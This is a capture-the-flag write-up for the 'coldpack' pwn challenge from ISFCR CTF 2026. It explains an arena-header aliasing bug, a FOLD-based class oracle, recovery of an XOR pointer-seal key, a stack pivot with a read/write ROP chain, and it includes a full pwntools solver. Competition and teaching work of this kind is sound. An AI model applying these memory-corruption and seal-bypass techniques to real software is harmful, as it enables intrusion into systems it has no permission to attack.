---
title: "coldpack — rimefold (IFSCR)"
description: "Service:** nc 0.cloud.chals.io 15036 — fresh process per connection."
event: "isfcr"
category: "pwn"
categoryLabel: "Pwn"
tags: ["ISFCR CTF 2026","pwn"]
date: "2026-10-11"
teammate: true
source: "isfcr/writeups/rimefold.md"
---

**Flag:** `isfcr{the_merge_3b7d_never_rechecked_the_hue_00cb8b04}`

**Service:** `nc 0.cloud.chals.io 15036` — fresh process per connection.

---

## 1. Recon

The handout is a stripped static‑PIE ELF (`coldpack`), self‑reporting ABI **1.3**. The live
service reports **1.4**, so the note ("the handout binary is the 1.3 bench revision of the
head… confirm anything that matters against your own head") is load‑bearing.

```
$ file coldpack
ELF 64-bit LSB pie executable, x86-64, static-pie linked, stripped
$ ./coldpack   # with FLAG=... env
coldpack rimefold abi 1.3 ready id=<32 hex>
```

On start the head:

* opens `/flag` (or falls back to the `FLAG` env var and copies it into a `memfd`);
* `mmap`s a `0x5000`‑byte anonymous arena;
* installs the seccomp filter shown in `seccomp.txt`;
* prints the banner.

Seccomp whitelists only:
`read, write, close, fstat, mmap, munmap, mprotect, exit, exit_group, rt_sigreturn`.
No `open`, no `execve`, no `sendfile` — so getting the flag out means **`read()` the flag fd
and `write()` it to stdout**.

### Protocol

```
NEW                       allocate a cell; prints OK cell <n>
DEL   <cell>              free a cell
STAGE <cell> [<cell>...]  append cells to the staging ring (max 64, dedup'd)
FOLD                      dry pass; prints OK folded <k>, clears ring
REAP                      live pass; compacts, runs the reaper; prints OK reaped <k>
DRAW  <cell> <nqwords>    read 1..32 qwords (hex) from a cell
PACK  <cell> <qhex>...    write up to 32 qwords (strtoull base 0 -> use 0x)
STAT                      counts
HELLO / QUIT
```

Limits: 64 cells, 256‑byte stride, ≤32 qwords per `DRAW`/`PACK`, 5000 commands and 60 s idle
per connection.

---

## 2. Arena layout

The `mmap` region is a **128‑byte header** followed by 64 cells at a 256‑byte stride. Cell
descriptors live in a separate `.bss` array (`{data_ptr, cap, live}`), so no command ever
prints a cell address.

```
arena 0x00  qword0   reaper function pointer (plain on 1.3, SEALED on 1.4)
arena 0x08  qword1   rdi argument handed to the reaper
arena 0x10  qword2   pie + 0x7ce0   (gadget table)
arena 0x18  qword3   arena base (self)
arena 0x20  qword4   flag fd
arena 0x28  qword5   magic 0x8b1e3fd7c0a64521
arena 0x30  qword6   reap counter
...
arena 0x80  cell 0 data, stride 0x100
```

The word at `qword2` is a tiny **gadget table** in `.text`:

```
0x7ce0  pop rax ; ret
0x7ce2  pop rdi ; ret
0x7ce4  pop rsi ; ret
0x7ce6  pop rdx ; ret
0x7ce8  syscall ; ret
0x7ceb  mov rsp, rdi ; ret
```

Cell "classes" are `random_byte & 7`, giving 8 buckets (`xmmword_8DD60 = 0x0707…`).

---

## 3. The bug

`REAP` coalesces runs of same‑class staged cells. For any run longer than 6 it **repoints the
last cell's data pointer at the arena header**:

```c
/* bench 1.3, around 0x8ac4 */
v9 += run_end - j - 1;
if (run_end - j > 6) {
    desc = &cell_desc[staging[run_end - 1]];
    desc->data = base;   /* <-- aliases the header            */
    desc->cap  = 16;     /* 16 qwords == 0x80 == whole header */
}
...
dword_B7A50 = 0;                 /* clear ring                  */
printf("OK reaped %d\n", v9);
++*(uint64_t *)(base + 0x30);
rdi = *(uint64_t *)(base + 8);
(*(void (*)(uint64_t))base)(rdi);   /* "the packer's reaper"   */
```

So the singular memory‑safety bug is a **type/aliasing error**: a normal cell can be made to
point at the header. That turns the header into a read/write cell with capacity 16 qwords:

* `DRAW` of the aliased cell leaks the header → **PIE base, arena base, flag fd, magic**.
* `PACK` of the aliased cell overwrites header qwords → **controls the function pointer and
  its argument**, and the fd.

The final `call [base]` is the "recovery cast": the header is reinterpreted as
`void (*)(void *)`.

---

## 4. Building the primitive

Because classes are only `0..7`, staging one full class (pigeonhole guarantees ≥8 cells among
64) yields a run > 6. To find a class without ever seeing the class bytes, use `FOLD` as an
**equality oracle**: staging exactly two cells returns `1` iff their classes match.

```
for each unclassified cell c:
    if fold([c, rep]) == 1: same class as rep
```

Greedy clustering, pipelining all `STAGE a b\nFOLD\n` pairs in one write, keeps this to a
handful of round trips.

After `REAP(best_class)` the repointed cell is `best[-1]`. `DRAW best[-1] 16` leaks the
header. On the bench 1.3 that already includes everything needed:

```
qword0 = pie+0x7ce1 (ret)   qword2 = pie+0x7ce0 (pop rax;ret)
qword3 = arena base         qword4 = flag fd (3)   qword5 = magic
```

---

## 5. Bench 1.3 → flag

Standard ret2syscall via the gadget table: the reaper does `call [qword0]` with `rdi = qword1`,
so putting `mov rsp, rdi ; ret` in `qword0` and a chain address in `qword1` pivots the stack
into a spare cell we control.

Chain (using the leaked `fd` and a known cell address `arena + 0x80 + 0x100*idx`):

```
pop rax ; 0        ; read
pop rdi ; fd
pop rsi ; buf
pop rdx ; 0x100
syscall
pop rax ; 1        ; write
pop rdi ; 1        ; stdout
pop rsi ; buf
pop rdx ; 0x100
syscall
pop rax ; 60 ; pop rdi ; 0 ; syscall   ; exit
```

`REAP` (empty ring) calls `[qword0]` → pivot → read the flag → write it to stdout.

---

## 6. Live 1.4 twist — "the sealed recovery cast"

On 1.4 the header vector looks like:

```
['0xe649ef1200513699', 0x0, '0x71fa4747bce0', '0x71fa4746f000', 0x5, 0x8b1e3fd7c0a64521, ...]
        ^ qword0 (random!)          ^ qword2 = pie+0x7ce0
```

`qword0` is no longer the plain `ret` gadget — it is **sealed**. That is the meaning of the
challenge note: the recovery cast is sealed in memory and will not hand you a pointer (DRAW
returns obfuscated bytes). The reaper *unseals* it before the call.

The seal is a per‑connection XOR. Because we know the intended plaintext on the bench is the
harmless `ret` at `pie + 0x7ce1`, we can recover the key from the leak:

```
pie = qword2 - 0x7ce0          # qword2 is still pie+0x7ce0
K   = qword0 ^ (pie + 0x7ce1)
```

Then to make the reaper call our pivot gadget, write the **sealed** form of it:

```
qword0 = PIVOT ^ K             # PIVOT = pie + 0x7ceb (mov rsp, rdi ; ret)
qword1 = chain_addr            # argument -> rdi
```

Trigger `REAP` → unseal → `call PIVOT` → `mov rsp, rdi ; ret` → ROP → **flag**.

Nice property: on 1.3 the key is `K = 0` (qword0 was already plain), so the *same* sealed
formula degenerates to the raw exploit and works on both revisions.

---

## 7. Final solver

```python
#!/usr/bin/env python3
import re, time
from pwn import *

context.log_level = 'error'
HOST, PORT = '0.cloud.chals.io', 15036

class CP:
    def __init__(self, io):
        self.io = io
        self.io.recvline(timeout=10)                 # banner
    def line(self):
        return self.io.recvline(timeout=20).decode(errors='replace').rstrip('\n')
    def cmd(self, s):
        self.io.sendline(s.encode()); return self.line()
    def new(self):
        r = self.cmd('NEW'); assert r.startswith('OK cell'), r
        return int(r.split()[-1])
    def stage(self, cells):
        assert self.cmd('STAGE ' + ' '.join(map(str, cells))) == 'OK'
    def fold_pairs(self, pairs):
        buf = []
        for a, b in pairs:
            buf += ['STAGE %d %d' % (a, b), 'FOLD']
        self.io.send(('\n'.join(buf) + '\n').encode())
        out = []
        for _ in pairs:
            assert self.line() == 'OK'
            out.append(int(self.line().split()[-1]))
        return out
    def reap(self, cells=None):
        if cells: self.stage(cells)
        r = self.cmd('REAP'); assert r.startswith('OK reaped'), r
        return int(r.split()[-1])
    def draw(self, cell, n):
        r = self.cmd('DRAW %d %d' % (cell, n)); assert r.startswith('OK '), r
        return [int(x, 16) for x in r[3:].split()]
    def pack(self, cell, qs):
        r = self.cmd('PACK %d %s' % (cell, ' '.join('0x%x' % (q & (2**64-1)) for q in qs)))
        assert r == 'OK', r

def main():
    io = remote(HOST, PORT)
    cp = CP(io)

    # 1) allocate all 64 cells
    cells = sorted({cp.new() for _ in range(64)})
    assert len(cells) == 64

    # 2) cluster cells by class using FOLD as an equality oracle
    unclassified, best = set(cells), None
    while unclassified:
        rep = min(unclassified)
        others = [c for c in sorted(unclassified) if c != rep]
        res = cp.fold_pairs([(rep, c) for c in others])
        group = [rep] + [c for c, r in zip(others, res) if r == 1]
        for c in group: unclassified.discard(c)
        if best is None or len(group) > len(best): best = group
        if len(best) >= 7: break

    # 3) defrag a whole class -> last cell now aliases the header
    cp.reap(best)
    fake = best[-1]
    hdr = cp.draw(fake, 16)                              # leak header

    arena = hdr[3]                                       # self pointer
    fd    = hdr[4]                                       # flag fd
    pie   = hdr[2] - 0x7ce0                              # qword2 == pie+0x7ce0
    K     = hdr[0] ^ (pie + 0x7ce1)                      # recover seal key (0 on 1.3)

    POP_RAX, POP_RDI, POP_RSI, POP_RDX = (pie+0x7ce0, pie+0x7ce2,
                                          pie+0x7ce4, pie+0x7ce6)
    SYSCALL, PIVOT = pie + 0x7ce8, pie + 0x7ceb

    # 4) ROP chain lives in a spare cell
    spare = [c for c in best if c != fake]
    chain_cell, buf_cell = spare[0], spare[1]
    chain = arena + 0x80 + 0x100*chain_cell
    buf   = arena + 0x80 + 0x100*buf_cell
    cp.pack(chain_cell, [
        POP_RAX, 0, POP_RDI, fd, POP_RSI, buf, POP_RDX, 0x100, SYSCALL,
        POP_RAX, 1, POP_RDI, 1, POP_RSI, buf, POP_RDX, 0x100, SYSCALL,
        POP_RAX, 60, POP_RDI, 0, SYSCALL,
    ])

    # 5) seal the pointer and aim the cast at the pivot; rdi -> chain
    h = hdr[:]
    h[1] = chain
    h[0] = PIVOT ^ K
    cp.pack(fake, h)

    io.sendline(b'REAP')
    time.sleep(1)
    data = io.recvrepeat(3)
    print(re.search(rb'isfcr\{[a-z0-9_]+\}', data).group(0).decode())

if __name__ == '__main__':
    main()
```

Output:

```
isfcr{the_merge_3b7d_never_rechecked_the_hue_00cb8b04}
```

---

## 8. Timeline / takeaways

| Step | Action |
|------|--------|
| 1 | `NEW` ×64; cluster with `FOLD` equality oracle (8 classes ⇒ run ≥7 exists) |
| 2 | `STAGE` one class + `REAP` ⇒ aliased header cell |
| 3 | `DRAW` alias ⇒ leak PIE, arena, fd, magic, sealed qword0 |
| 4 | `PACK` spare cell with `read(fd)/write(1)` ROP |
| 5 | `PACK` alias `qword0 = pivot^key`, `qword1 = chain`; `REAP` ⇒ pivot ⇒ flag |

Root cause: **the defragmenter writes an arena‑header pointer into a cell descriptor without
checking bounds/ownership** (CWE‑787 / CWE‑823): a self‑referential compaction turns the header
into an addressable, writable cell, and the header itself is later used as a function pointer.
The 1.4 patch obfuscates the call pointer but leaks enough (`qword2`, known plaintext) to
recover the per‑connection seal key.
